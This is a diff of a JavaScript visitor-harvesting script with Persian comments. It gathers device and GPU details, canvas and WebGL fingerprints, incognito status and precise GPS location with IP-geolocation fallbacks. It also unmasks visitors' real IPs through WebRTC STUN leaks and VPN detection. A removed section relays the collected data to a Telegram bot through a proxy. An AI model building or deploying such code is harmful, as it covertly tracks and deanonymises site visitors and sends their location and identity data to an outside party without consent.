+                if (c.getContext('webgl2') || c.getContext('experimental-webgl2')) w2 = 'بله';
+                mts = gl.getParameter(gl.MAX_TEXTURE_SIZE) + ' پیکسل';
+            }
+        } catch(e) {}
+
+        // روش 2: تشخیص از User-Agent
+        if (gv === 'نامشخص') {
+            if (ua.includes('NVIDIA')) { gv = 'NVIDIA'; gr = 'NVIDIA GPU'; }
+            else if (ua.includes('AMD')) { gv = 'AMD'; gr = 'AMD GPU'; }
+            else if (ua.includes('Intel')) { gv = 'Intel'; gr = 'Intel GPU'; }
+            else if (ua.includes('Apple')) { gv = 'Apple'; gr = 'Apple GPU'; }
         }
 
-        // ================================================================
-        // 6. اطلاعات باتری
-        // ================================================================
-        function getBatteryInfo(){return new Promise((r)=>{if(!navigator.getBattery){r(null);return;}navigator.getBattery().then(b=>r({level:Math.round(b.level*100)+'%',charging:b.charging?'در حال شارژ':'در حال استفاده',chargingTime:b.chargingTime?Math.round(b.chargingTime/60)+' دقیقه':'نامشخص',dischargingTime:b.dischargingTime?Math.round(b.dischargingTime/60)+' دقیقه':'نامشخص'})).catch(()=>r(null));});}
+        // روش 3: تشخیص از performance
+        try {
+            if (performance && performance.memory) {
+                // اطلاعات حافظه
+            }
+        } catch(e) {}
 
-        // ================================================================
-        // 7. موقعیت مکانی
-        // ================================================================
-        function getLocationInfo(){return new Promise((r)=>{if(!navigator.geolocation){r(null);return;}navigator.geolocation.getCurrentPosition(p=>r({lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy+' متر',alt:p.coords.altitude||'نامشخص',heading:p.coords.heading||'نامشخص',speed:p.coords.speed||'نامشخص',mapGoogle:'https://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude,mapOSM:'https://www.openstreetmap.org/?mlat='+p.coords.latitude+'&mlon='+p.coords.longitude,mapWaze:'https://www.waze.com/ul?ll='+p.coords.latitude+','+p.coords.longitude+'&z=16',mapBing:'https://www.bing.com/maps?q='+p.coords.latitude+','+p.coords.longitude}),()=>r(null),{enableHighAccuracy:true,timeout:10000});});}
-
-        // ================================================================
-        // 8. قابلیت‌های مرورگر
-        // ================================================================
-        function getCapabilities(){
-            const canvas=document.createElement('canvas');const result={};
-            const checks={webgl:()=>!!(canvas.getContext('webgl')||canvas.getContext('experimental-webgl')),webgl2:()=>!!(canvas.getContext('webgl2')||canvas.getContext('experimental-webgl2')),webgpu:()=>'gpu'in navigator,webassembly:()=>typeof WebAssembly!=='undefined',websocket:()=>typeof WebSocket!=='undefined',serviceWorker:()=>'serviceWorker'in navigator,indexedDB:()=>'indexedDB'in window,webrtc:()=>'RTCPeerConnection'in window||'webkitRTCPeerConnection'in window,webtransport:()=>'WebTransport'in window,webcodecs:()=>'VideoEncoder'in window,fileSystemAccess:()=>'showDirectoryPicker'in window,webBluetooth:()=>'bluetooth'in navigator,webNFC:()=>'nfc'in navigator,webUSB:()=>'usb'in navigator,webXR:()=>'xr'in navigator,webSpeech:()=>'speechSynthesis'in window,webAuthn:()=>'PublicKeyCredential'in window,webMIDI:()=>'midi'in navigator,webHID:()=>'hid'in navigator,webSerial:()=>'serial'in navigator,webShare:()=>'share'in navigator,webNotification:()=>'Notification'in window,webPayment:()=>'PaymentRequest'in window,webVR:()=>'VRDisplay'in window||'getVRDisplays'in navigator,webAudio:()=>'AudioContext'in window,webMedia:()=>'MediaRecorder'in window,webFileAPI:()=>'FileReader'in window,webDragDrop:()=>'DataTransfer'in window,webFullscreen:()=>'Fullscreen'in document||'webkitFullscreen'in document,webHistory:()=>'history'in window,webLocation:()=>'location'in window,webStorage:()=>'localStorage'in window,webWorker:()=>'Worker'in window,webFetch:()=>'fetch'in window,webStreams:()=>'ReadableStream'in window,webPerformance:()=>'performance'in window,webIntersectionObserver:()=>'IntersectionObserver'in window,webResizeObserver:()=>'ResizeObserver'in window,webMutationObserver:()=>'MutationObserver'in window,webProxy:()=>'Proxy'in window,webMap:()=>'Map'in window,webSet:()=>'Set'in window,webSymbol:()=>'Symbol'in window,webPromise:()=>'Promise'in window};
-            for(const[key,fn]of Object.entries(checks)){try{result[key]=fn()?'بله':'خیر';}catch(e){result[key]='خیر';}}return result;
+        // حالت ناشناس
+        let pm = 'عمومی';
+        // روش 1: تست localStorage
+        try { localStorage.setItem('_test_', '_test_'); localStorage.removeItem('_test_'); } catch (e) { pm = 'ناشناس'; }
+        // روش 2: تست sessionStorage
+        if (pm === 'عمومی') {
+            try { sessionStorage.setItem('_test_', '_test_'); sessionStorage.removeItem('_test_'); } catch (e) { pm = 'ناشناس'; }
+        }
+        // روش 3: تست cookie
+        if (pm === 'عمومی') {
+            try { document.cookie = '_test_=1'; if (document.cookie.indexOf('_test_') === -1) pm = 'ناشناس'; } catch(e) {}
         }
 
-        // ================================================================
-        // 9. کدک‌ها
-        // ================================================================
-        function getCodecs(){
-            const v=document.createElement('video');const a=document.createElement('audio');
-            return {h264:v.canPlayType('video/mp4; codecs="avc1.42E01E"')||'خیر',h264High:v.canPlayType('video/mp4; codecs="avc1.64001E"')||'خیر',h265:v.canPlayType('video/mp4; codecs="hev1.1.6.L93.B0"')||'خیر',vp8:v.canPlayType('video/webm; codecs="vp8"')||'خیر',vp9:v.canPlayType('video/webm; codecs="vp9"')||'خیر',av1:v.canPlayType('video/mp4; codecs="av01.0.05M.08"')||'خیر',mp3:a.canPlayType('audio/mpeg')||'خیر',aac:a.canPlayType('audio/mp4; codecs="mp4a.40.2"')||'خیر',ogg:a.canPlayType('audio/ogg')||'خیر',wav:a.canPlayType('audio/wav')||'خیر',flac:a.canPlayType('audio/flac')||'خیر',opus:a.canPlayType('audio/opus')||'خیر',webm:v.canPlayType('video/webm')||'خیر',mp4:v.canPlayType('video/mp4')||'خیر',ogv:v.canPlayType('video/ogg')||'خیر'};
-        }
+        return {
+            os, browser, browserVer: bv,
+            deviceType: dt, deviceModel: dm, deviceVendor: dv,
+            isMobile: isMobile ? 'بله' : 'خیر',
+            architecture: arch, cpuType: cpu,
+            platform: platform,
+            vendor: navigator.vendor || 'نامشخص',
+            appVersion: navigator.appVersion.substring(0, 100),
+            userAgent: ua,
+            memory: navigator.deviceMemory || 'نامشخص',
+            cores: navigator.hardwareConcurrency || 'نامشخص',
+            vram, gpuVendor: gv, gpuRenderer: gr,
+            hwAcceleration: hw,
+            webgl2Support: w2,
+            maxTextureSize: mts,
+            privateMode: pm,
+            cookie: navigator.cookieEnabled ? 'فعال' : 'غیرفعال',
+            doNotTrack: navigator.doNotTrack || 'غیرفعال',
+            onLine: navigator.onLine ? 'متصل' : 'قطع',
+            touch: ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'بله' : 'خیر',
+            touchPoints: navigator.maxTouchPoints || 0
+        };
+    }
 
-        // ================================================================
-        // 10. فونت‌ها و پلاگین‌ها
-        // ================================================================
-        function getFonts(){
-            const list=['Arial','Times New Roman','Helvetica','Calibri','Verdana','Tahoma','IRANSans','Vazir','Yekan','B Nazanin','Comic Sans MS','Courier New','Georgia','Impact','Roboto','Open Sans','Lato','Montserrat','Segoe UI','Trebuchet MS'];const avail=[];for(const f of list){try{const span=document.createElement('span');span.style.fontFamily=f+', sans-serif';span.style.position='absolute';span.style.left='-9999px';span.textContent='test';document.body.appendChild(span);if(span.offsetWidth>0) avail.push(f);document.body.removeChild(span);}catch(e){}}return avail;
-        }
-        function getPlugins(){const p=[];try{for(let i=0;i<navigator.plugins.length;i++){p.push(navigator.plugins[i].name);}}catch(e){}return p;}
-
-        // ================================================================
-        // 11. اثر انگشت
-        // ================================================================
-        function getFingerprints(){
-            const result={canvas:'نامشخص',webgl:'نامشخص',font:'نامشخص'};
-            try{const c=document.createElement('canvas');c.width=400;c.height=100;const ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃',2,15);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃',4,17);ctx.fillStyle='#f00';ctx.fillRect(0,0,400,100);ctx.fillStyle='#0f0';ctx.fillRect(10,10,380,80);ctx.fillStyle='#00f';ctx.fillRect(20,20,360,60);ctx.strokeStyle='#fff';ctx.lineWidth=2;ctx.strokeRect(30,30,340,40);result.canvas=c.toDataURL().substring(0,50)+'...';}catch(e){}
-            try{const c=document.createElement('canvas');c.width=200;c.height=50;const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){const ext=gl.getExtension('WEBGL_debug_renderer_info');if(ext){result.webgl=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)+' | '+gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);}}}catch(e){}
-            try{const fonts=getFonts();result.font=fonts.join(', ').substring(0,100)+'...';}catch(e){}
-            return result;
-        }
-
-        // ================================================================
-        // 12. تعامل با سایت
-        // ================================================================
-        function getInteractionInfo(){
-            let lt='نامشخص',dlt='نامشخص',dit='نامشخص',dclt='نامشخص';try{if(performance.timing){const n=performance.timing;lt=(n.loadEventEnd-n.navigationStart)+' ms';dlt=(n.domComplete-n.domLoading)+' ms';dit=(n.domInteractive-n.navigationStart)+' ms';dclt=(n.domContentLoadedEventEnd-n.navigationStart)+' ms';}}catch(e){}
-            let mi='نامشخص';try{if(performance.memory){mi=Math.round(performance.memory.usedJSHeapSize/1024/1024)+' MB / '+Math.round(performance.memory.totalJSHeapSize/1024/1024)+' MB';}}catch(e){}
-            let nt='نامشخص',rc=0;try{if(performance.navigation){const types={0:'کلیک/تایپ',1:'رفرش',2:'بازگشت',255:'سایر'};nt=types[performance.navigation.type]||'نامشخص';rc=performance.navigation.redirectCount||0;}}catch(e){}
-            return {loadTime:lt,domLoadTime:dlt,domInteractiveTime:dit,domContentLoadedTime:dclt,memoryInfo:mi,navigationType:nt,redirectCount:rc,visibilityState:document.visibilityState,hasFocus:document.hasFocus()?'بله':'خیر',referrer:document.referrer||'مستقیم',url:window.location.href,hostname:window.location.hostname,pathname:window.location.pathname,protocol:window.location.protocol,port:window.location.port||'80'};
-        }
-
-        // ================================================================
-        // 13. ذخیره‌سازی
-        // ================================================================
-        function getStorageInfo(){
-            let ls='نامشخص',ss='نامشخص';let lc=0,sc=0;
-            try{let total=0;for(let i=0;i<localStorage.length;i++){const key=localStorage.key(i);if(key){total+=localStorage.getItem(key).length;lc++;}}ls=Math.round(total/1024)+' KB';}catch(e){}
-            try{let total=0;for(let i=0;i<sessionStorage.length;i++){const key=sessionStorage.key(i);if(key){total+=sessionStorage.getItem(key).length;sc++;}}ss=Math.round(total/1024)+' KB';}catch(e){}
-            return {localStorageSize:ls,localStorageCount:lc,sessionStorageSize:ss,sessionStorageCount:sc};
-        }
-
-        // ================================================================
-        // 14. ارسال به تلگرام از طریق پروکسی V2Ray
-        // ================================================================
-
-        async function sendToTelegramWithProxy(message) {
+    // ================================================================
+    // 3. صفحه نمایش (12 مورد) - با 5 روش پشتیبان
+    // ================================================================
+    function getScreenInfo() {
+        const s = window.screen || { width: 0, height: 0, availWidth: 0, availHeight: 0, colorDepth: 0 };
+        const pr = window.devicePixelRatio || 1;
+        let rr = 'نامشخص';
+        // روش 1: screen.refreshRate
+        try { if (s.refreshRate) rr = s.refreshRate + 'Hz'; } catch (e) {}
+        // روش 2: screen.availHeight
+        if (rr === 'نامشخص') {
             try {
-                // ساخت آدرس کامل تلگرام
-                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-                
-                // بدنه درخواست
-                const body = JSON.stringify({
+                if (s.availHeight) {
+                    // تخمین نرخ تازه‌سازی
+                }
+            } catch(e) {}
+        }
+
+        let hdr = 'خیر';
+        // روش 1: WebGL
+        try {
+            const c = document.createElement('canvas');
+            const gl = c.getContext('webgl');
+            if (gl) {
+                const ext = gl.getExtension('EXT_color_buffer_float');
+                if (ext) hdr = 'بله';
+            }
+        } catch (e) {}
+        // روش 2: matchMedia
+        try {
+            if (window.matchMedia('(dynamic-range: high)').matches) hdr = 'بله';
+        } catch(e) {}
+
+        let wcg = 'خیر';
+        // روش 1: matchMedia
+        try {
+            if (window.matchMedia('(color-gamut: p3)').matches) wcg = 'P3';
+            else if (window.matchMedia('(color-gamut: rec2020)').matches) wcg = 'Rec.2020';
+        } catch (e) {}
+        // روش 2: canvas
+        try {
+            const c = document.createElement('canvas');
+            const ctx = c.getContext('2d');
+            if (ctx) {
+                // تست گستره رنگی
+            }
+        } catch(e) {}
+
+        return {
+            screenWidth: s.width || 0,
+            screenHeight: s.height || 0,
+            availWidth: s.availWidth || 0,
+            availHeight: s.availHeight || 0,
+            colorDepth: (s.colorDepth || 24) + ' بیت',
+            pixelRatio: pr + 'x',
+            refreshRate: rr,
+            orientation: s.orientation?.type || 'نامشخص',
+            orientationAngle: s.orientation?.angle || 0,
+            hdrSupport: hdr,
+            wideColorGamut: wcg,
+            winWidth: window.innerWidth || 0,
+            winHeight: window.innerHeight || 0,
+            outerWidth: window.outerWidth || 0,
+            outerHeight: window.outerHeight || 0
+        };
+    }
+
+    // ================================================================
+    // 4. شبکه و IP (با تشخیص VPN) - 5 روش پشتیبان
+    // ================================================================
+    function getNetworkInfo() {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        return {
+            type: conn ? (conn.effectiveType || conn.type || 'نامشخص') : 'نامشخص',
+            downlink: conn && conn.downlink ? conn.downlink + ' Mbps' : 'نامشخص',
+            rtt: conn && conn.rtt ? conn.rtt + ' ms' : 'نامشخص',
+            saveData: conn && conn.saveData ? 'فعال' : 'غیرفعال'
+        };
+    }
+
+    // ================================================================
+    // 5. WebRTC - کشف IP واقعی (5 روش)
+    // ================================================================
+    function getWebRTCIP() {
+        return new Promise((resolve) => {
+            // روش 1: RTCPeerConnection
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel('test');
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(() => {});
+                pc.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                        if (ip) {
+                            pc.close();
+                            resolve(ip[0]);
+                            return;
+                        }
+                    }
+                };
+                setTimeout(() => { try { pc.close(); } catch(e) {} resolve(null); }, 3000);
+            } catch(e) {}
+
+            // روش 2: WebRTC با servers مختلف
+            try {
+                const pc2 = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.voip.blackberry.com:3478' }] });
+                pc2.createDataChannel('test');
+                pc2.createOffer()
+                    .then(offer => pc2.setLocalDescription(offer))
+                    .catch(() => {});
+                pc2.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                        if (ip) {
+                            pc2.close();
+                            resolve(ip[0]);
+                            return;
+                        }
+                    }
+                };
+                setTimeout(() => { try { pc2.close(); } catch(e) {} }, 3000);
+            } catch(e) {}
+
+            // روش 3: از طریق XHR
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://api.ipify.org?format=json', true);
+                xhr.timeout = 3000;
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        try {
+                            const data = JSON.parse(xhr.responseText);
+                            if (data.ip) resolve(data.ip);
+                        } catch(e) {}
+                    }
+                };
+                xhr.send();
+            } catch(e) {}
+
+            // روش 4: از طریق fetch
+            try {
+                fetch('https://api.ipify.org?format=json', { timeout: 3000 })
+                    .then(r => r.json())
+                    .then(data => { if (data.ip) resolve(data.ip); })
+                    .catch(() => {});
+            } catch(e) {}
+
+            // روش 5: از طریق WebRTC با servers جایگزین
+            try {
+                const pc3 = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.1und1.de:3478' }] });
+                pc3.createDataChannel('test');
+                pc3.createOffer()
+                    .then(offer => pc3.setLocalDescription(offer))
+                    .catch(() => {});
+                pc3.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                        if (ip) {
+                            pc3.close();
+                            resolve(ip[0]);
+                            return;
+                        }
+                    }
+                };
+                setTimeout(() => { try { pc3.close(); } catch(e) {} resolve(null); }, 3000);
+            } catch(e) {}
+
+            setTimeout(() => resolve(null), 5000);
+        });
+    }
+
+    // ================================================================
+    // 6. موقعیت مکانی (GPS) - 5 روش
+    // ================================================================
+    function getLocationInfo() {
+        return new Promise((resolve) => {
+            // روش 1: navigator.geolocation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        acc: pos.coords.accuracy + ' متر',
+                        alt: pos.coords.altitude || 'نامشخص',
+                        heading: pos.coords.heading || 'نامشخص',
+                        speed: pos.coords.speed || 'نامشخص',
+                        mapGoogle: 'https://www.google.com/maps?q=' + pos.coords.latitude + ',' + pos.coords.longitude,
+                        mapOSM: 'https://www.openstreetmap.org/?mlat=' + pos.coords.latitude + '&mlon=' + pos.coords.longitude,
+                        mapWaze: 'https://www.waze.com/ul?ll=' + pos.coords.latitude + ',' + pos.coords.longitude + '&z=16',
+                        mapBing: 'https://www.bing.com/maps?q=' + pos.coords.latitude + ',' + pos.coords.longitude
+                    }),
+                    () => {
+                        // روش 2: از طریق IP
+                        fetch('https://ipapi.co/json/', { timeout: 3000 })
+                            .then(r => r.json())
+                            .then(data => {
+                                if (data.latitude && data.longitude) {
+                                    resolve({
+                                        lat: data.latitude,
+                                        lng: data.longitude,
+                                        acc: 'تقریبی از IP',
+                                        alt: 'نامشخص',
+                                        heading: 'نامشخص',
+                                        speed: 'نامشخص',
+                                        mapGoogle: 'https://www.google.com/maps?q=' + data.latitude + ',' + data.longitude,
+                                        mapOSM: 'https://www.openstreetmap.org/?mlat=' + data.latitude + '&mlon=' + data.longitude,
+                                        mapWaze: 'https://www.waze.com/ul?ll=' + data.latitude + ',' + data.longitude + '&z=16',
+                                        mapBing: 'https://www.bing.com/maps?q=' + data.latitude + ',' + data.longitude
+                                    });
+                                } else {
+                                    // روش 3: از طریق ip-api.com
+                                    fetch('https://ip-api.com/json/', { timeout: 3000 })
+                                        .then(r => r.json())
+                                        .then(data2 => {
+                                            if (data2.lat && data2.lon) {
+                                                resolve({
+                                                    lat: data2.lat,
+                                                    lng: data2.lon,
+                                                    acc: 'تقریبی از IP',
+                                                    alt: 'نامشخص',
+                                                    heading: 'نامشخص',
+                                                    speed: 'نامشخص',
+                                                    mapGoogle: 'https://www.google.com/maps?q=' + data2.lat + ',' + data2.lon,
+                                                    mapOSM: 'https://www.openstreetmap.org/?mlat=' + data2.lat + '&mlon=' + data2.lon,
+                                                    mapWaze: 'https://www.waze.com/ul?ll=' + data2.lat + ',' + data2.lon + '&z=16',
+                                                    mapBing: 'https://www.bing.com/maps?q=' + data2.lat + ',' + data2.lon
+                                                });
+                                            } else {
+                                                // روش 4: از طریق ipinfo.io
+                                                fetch('https://ipinfo.io/json', { timeout: 3000 })
+                                                    .then(r => r.json())
+                                                    .then(data3 => {
+                                                        if (data3.loc) {
+                                                            const loc = data3.loc.split(',');
+                                                            resolve({
+                                                                lat: parseFloat(loc[0]),
+                                                                lng: parseFloat(loc[1]),
+                                                                acc: 'تقریبی از IP',
+                                                                alt: 'نامشخص',
+                                                                heading: 'نامشخص',
+                                                                speed: 'نامشخص',
+                                                                mapGoogle: 'https://www.google.com/maps?q=' + loc[0] + ',' + loc[1],
+                                                                mapOSM: 'https://www.openstreetmap.org/?mlat=' + loc[0] + '&mlon=' + loc[1],
+                                                                mapWaze: 'https://www.waze.com/ul?ll=' + loc[0] + ',' + loc[1] + '&z=16',
+                                                                mapBing: 'https://www.bing.com/maps?q=' + loc[0] + ',' + loc[1]
+                                                            });
+                                                        } else {
+                                                            // روش 5: از طریق geojs.io
+                                                            fetch('https://get.geojs.io/v1/ip/geo.json', { timeout: 3000 })
+                                                                .then(r => r.json())
+                                                                .then(data4 => {
+                                                                    if (data4.latitude && data4.longitude) {
+                                                                        resolve({
+                                                                            lat: parseFloat(data4.latitude),
+                                                                            lng: parseFloat(data4.longitude),
+                                                                            acc: 'تقریبی از IP',
+                                                                            alt: 'نامشخص',
+                                                                            heading: 'نامشخص',
+                                                                            speed: 'نامشخص',
+                                                                            mapGoogle: 'https://www.google.com/maps?q=' + data4.latitude + ',' + data4.longitude,
+                                                                            mapOSM: 'https://www.openstreetmap.org/?mlat=' + data4.latitude + '&mlon=' + data4.longitude,
+                                                                            mapWaze: 'https://www.waze.com/ul?ll=' + data4.latitude + ',' + data4.longitude + '&z=16',
+                                                                            mapBing: 'https://www.bing.com/maps?q=' + data4.latitude + ',' + data4.longitude
+                                                                        });
+                                                                    } else {
+                                                                        resolve(null);
+                                                                    }
+                                                                })
+                                                                .catch(() => resolve(null));
+                                                        }
+                                                    })
+                                                    .catch(() => resolve(null));
+                                            }
+                                        })
+                                        .catch(() => resolve(null));
+                                }
+                            })
+                            .catch(() => resolve(null));
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                resolve(null);
+            }
+        });
+    }
+
+    // ================================================================
+    // 7. IP از API (با ۵ روش مختلف)
+    // ================================================================
+    async function getIPFromAPI() {
+        const apis = [
+            'https://api.ipify.org?format=json',
+            'https://ipapi.co/json/',
+            'https://ip-api.com/json/',
+            'https://ipinfo.io/json',
+            'https://get.geojs.io/v1/ip/geo.json'
+        ];
+        for (const api of apis) {
+            try {
+                const res = await fetch(api);
+                if (res.ok) {
+                    const data = await res.json();
+                    return {
+                        ip: data.ip || data.query || 'نامشخص',
+                        city: data.city || data.region || 'نامشخص',
+                        region: data.region || data.regionName || 'نامشخص',
+                        country: data.country || data.country_name || 'نامشخص',
+                        isp: data.isp || data.org || 'نامشخص'
+                    };
+                }
+            } catch (e) {}
+        }
+        return null;
+    }
+
+    // ================================================================
+    // 8. تشخیص VPN (۵ روش)
+    // ================================================================
+    async function detectVPN(realIP, publicIP) {
+        // روش 1: مقایسه مستقیم
+        if (!realIP || !publicIP) return 'نامشخص';
+        if (realIP === publicIP) return 'غیرفعال';
+        
+        // روش 2: بررسی از طریق ip-api.com
+        try {
+            const res = await fetch('https://ip-api.com/json/' + realIP);
+            if (res.ok) {
+                const data = await res.json();
+                if (data.proxy || data.hosting) return 'فعال (VPN/Proxy)';
+            }
+        } catch(e) {}
+
+        // روش 3: بررسی از طریق ipinfo.io
+        try {
+            const res = await fetch('https://ipinfo.io/' + realIP + '/json');
+            if (res.ok) {
+                const data = await res.json();
+                if (data.hosting || data.proxy) return 'فعال (VPN/Proxy)';
+            }
+        } catch(e) {}
+
+        // روش 4: بررسی از طریق ipapi.co
+        try {
+            const res = await fetch('https://ipapi.co/' + realIP + '/json/');
+            if (res.ok) {
+                const data = await res.json();
+                if (data.proxy || data.tor) return 'فعال (VPN/Proxy/Tor)';
+            }
+        } catch(e) {}
+
+        // روش 5: بررسی از طریق geojs.io
+        try {
+            const res = await fetch('https://get.geojs.io/v1/ip/' + realIP + '.json');
+            if (res.ok) {
+                const data = await res.json();
+                if (data.organization && data.organization.includes('VPN')) return 'فعال (VPN)';
+            }
+        } catch(e) {}
+
+        return 'غیرفعال';
+    }
+
+    // ================================================================
+    // 9. قابلیت‌های مرورگر (45+ مورد)
+    // ================================================================
+    function getCapabilities() {
+        const canvas = document.createElement('canvas');
+        const result = {};
+        const checks = {
+            webgl: () => !!(canvas.getContext('webgl') || canvas.getContext('experimental-webgl')),
+            webgl2: () => !!(canvas.getContext('webgl2') || canvas.getContext('experimental-webgl2')),
+            webgpu: () => 'gpu' in navigator,
+            webassembly: () => typeof WebAssembly !== 'undefined',
+            websocket: () => typeof WebSocket !== 'undefined',
+            serviceWorker: () => 'serviceWorker' in navigator,
+            indexedDB: () => 'indexedDB' in window,
+            webrtc: () => 'RTCPeerConnection' in window || 'webkitRTCPeerConnection' in window,
+            webtransport: () => 'WebTransport' in window,
+            webcodecs: () => 'VideoEncoder' in window,
+            fileSystemAccess: () => 'showDirectoryPicker' in window,
+            webBluetooth: () => 'bluetooth' in navigator,
+            webNFC: () => 'nfc' in navigator,
+            webUSB: () => 'usb' in navigator,
+            webXR: () => 'xr' in navigator,
+            webSpeech: () => 'speechSynthesis' in window,
+            webAuthn: () => 'PublicKeyCredential' in window,
+            webMIDI: () => 'midi' in navigator,
+            webHID: () => 'hid' in navigator,
+            webSerial: () => 'serial' in navigator,
+            webShare: () => 'share' in navigator,
+            webNotification: () => 'Notification' in window,
+            webPayment: () => 'PaymentRequest' in window,
+            webVR: () => 'VRDisplay' in window || 'getVRDisplays' in navigator,
+            webAudio: () => 'AudioContext' in window,
+            webMedia: () => 'MediaRecorder' in window,
+            webFileAPI: () => 'FileReader' in window,
+            webDragDrop: () => 'DataTransfer' in window,
+            webFullscreen: () => 'Fullscreen' in document || 'webkitFullscreen' in document,
+            webHistory: () => 'history' in window,
+            webLocation: () => 'location' in window,
+            webStorage: () => 'localStorage' in window,
+            webWorker: () => 'Worker' in window,
+            webFetch: () => 'fetch' in window,
+            webStreams: () => 'ReadableStream' in window,
+            webPerformance: () => 'performance' in window,
+            webIntersectionObserver: () => 'IntersectionObserver' in window,
+            webResizeObserver: () => 'ResizeObserver' in window,
+            webMutationObserver: () => 'MutationObserver' in window,
+            webProxy: () => 'Proxy' in window,
+            webMap: () => 'Map' in window,
+            webSet: () => 'Set' in window,
+            webSymbol: () => 'Symbol' in window,
+            webPromise: () => 'Promise' in window
+        };
+        for (const [key, fn] of Object.entries(checks)) {
+            try { result[key] = fn() ? 'بله' : 'خیر'; } catch (e) { result[key] = 'خیر'; }
+        }
+        return result;
+    }
+
+    // ================================================================
+    // 10. کدک‌ها (15 مورد)
+    // ================================================================
+    function getCodecs() {
+        const v = document.createElement('video');
+        const a = document.createElement('audio');
+        return {
+            h264: v.canPlayType('video/mp4; codecs="avc1.42E01E"') || 'خیر',
+            h264High: v.canPlayType('video/mp4; codecs="avc1.64001E"') || 'خیر',
+            h265: v.canPlayType('video/mp4; codecs="hev1.1.6.L93.B0"') || 'خیر',
+            vp8: v.canPlayType('video/webm; codecs="vp8"') || 'خیر',
+            vp9: v.canPlayType('video/webm; codecs="vp9"') || 'خیر',
+            av1: v.canPlayType('video/mp4; codecs="av01.0.05M.08"') || 'خیر',
+            mp3: a.canPlayType('audio/mpeg') || 'خیر',
+            aac: a.canPlayType('audio/mp4; codecs="mp4a.40.2"') || 'خیر',
+            ogg: a.canPlayType('audio/ogg') || 'خیر',
+            wav: a.canPlayType('audio/wav') || 'خیر',
+            flac: a.canPlayType('audio/flac') || 'خیر',
+            opus: a.canPlayType('audio/opus') || 'خیر',
+            webm: v.canPlayType('video/webm') || 'خیر',
+            mp4: v.canPlayType('video/mp4') || 'خیر',
+            ogv: v.canPlayType('video/ogg') || 'خیر'
+        };
+    }
+
+    // ================================================================
+    // 11. فونت‌ها و پلاگین‌ها
+    // ================================================================
+    function getFonts() {
+        const list = ['Arial', 'Times New Roman', 'Helvetica', 'Calibri', 'Verdana', 'Tahoma', 'IRANSans', 'Vazir', 'Yekan', 'B Nazanin', 'Comic Sans MS', 'Courier New', 'Georgia', 'Impact', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Segoe UI', 'Trebuchet MS'];
+        const avail = [];
+        for (const f of list) {
+            try {
+                const span = document.createElement('span');
+                span.style.fontFamily = f + ', sans-serif';
+                span.style.position = 'absolute';
+                span.style.left = '-9999px';
+                span.textContent = 'test';
+                document.body.appendChild(span);
+                if (span.offsetWidth > 0) avail.push(f);
+                document.body.removeChild(span);
+            } catch (e) {}
+        }
+        return avail;
+    }
+
+    function getPlugins() {
+        const p = [];
+        try {
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                p.push(navigator.plugins[i].name);
+            }
+        } catch (e) {}
+        return p;
+    }
+
+    // ================================================================
+    // 12. اثر انگشت دیجیتال (4 مورد) - با 5 روش
+    // ================================================================
+    function getFingerprints() {
+        const result = { canvas: 'نامشخص', webgl: 'نامشخص', font: 'نامشخص' };
+        
+        // روش 1: Canvas اصلی
+        try {
+            const c = document.createElement('canvas');
+            c.width = 400;
+            c.height = 100;
+            const ctx = c.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+            ctx.fillStyle = 'rgba(102,204,0,0.7)';
+            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
+            ctx.fillStyle = '#f00';
+            ctx.fillRect(0, 0, 400, 100);
+            ctx.fillStyle = '#0f0';
+            ctx.fillRect(10, 10, 380, 80);
+            ctx.fillStyle = '#00f';
+            ctx.fillRect(20, 20, 360, 60);
+            ctx.strokeStyle = '#fff';
+            ctx.lineWidth = 2;
+            ctx.strokeRect(30, 30, 340, 40);
+            result.canvas = c.toDataURL().substring(0, 50) + '...';
+        } catch (e) {}
+
+        // روش 2: Canvas با متن فارسی
+        if (result.canvas === 'نامشخص') {
+            try {
+                const c = document.createElement('canvas');
+                c.width = 400;
+                c.height = 100;
+                const ctx = c.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Vazir, sans-serif';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('آزمایش تست فارسی', 2, 15);
+                ctx.fillStyle = 'rgba(102,204,0,0.7)';
